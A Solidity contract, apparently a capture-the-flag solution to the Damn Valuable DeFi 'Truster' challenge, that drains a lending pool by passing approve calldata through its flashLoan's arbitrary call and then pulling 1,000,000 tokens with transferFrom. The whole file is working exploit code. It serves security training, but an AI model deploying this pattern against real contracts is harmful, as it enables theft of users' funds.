// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";

interface TrusterLP {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

contract TrusterLenderPoolAttacker {
    
    DamnValuableToken public immutable token;
    TrusterLP public immutable lendingPool;

    constructor(DamnValuableToken _token, address _lendingPool) {
        token = _token;
        lendingPool = TrusterLP(_lendingPool);
    }


    function attack() public {
        // Attack is
        // 1) build call data to call approval abi.encodeWithSignature("approve(address,uint256)",_spender, _amount)
        // 2) Call lending pool with calldata bytes
        // 3) Call transferFrom on DVT
        bytes memory attackData = abi.encodeWithSignature("approve(address,uint256)",address(this), 1000000 ether);
        
        lendingPool.flashLoan(0, address(this), address(token), attackData);

        token.transferFrom(address(lendingPool), address(this), 1000000 ether);
    }
}